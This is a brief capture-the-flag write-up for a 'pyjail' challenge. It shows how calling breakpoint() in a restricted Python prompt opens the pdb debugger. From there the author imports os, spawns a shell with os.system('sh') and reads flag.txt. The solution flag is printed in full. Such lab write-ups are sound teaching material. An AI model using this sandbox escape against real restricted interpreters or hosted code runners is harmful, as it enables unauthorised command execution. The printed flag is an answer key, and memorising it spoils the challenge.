# pyjail

## Write-up

- `breakpoint()` builtin in python open pdb which is python debugger and it's an interpreter also

```
~ nc localhost 1337
>>> breakpoint()
--Return--
> <string>(1)<module>()->None
(Pdb) import os
(Pdb) os.system("sh")
ls
entrypoint.sh
flag.txt
script.py
cat flag.txt
shellmates{BR3kP01nT_BuiLT1N_D0_M4g1C_98765}
```

## Flag
`shellmates{BR3kP01nT_BuiLT1N_D0_M4g1C_98765}`
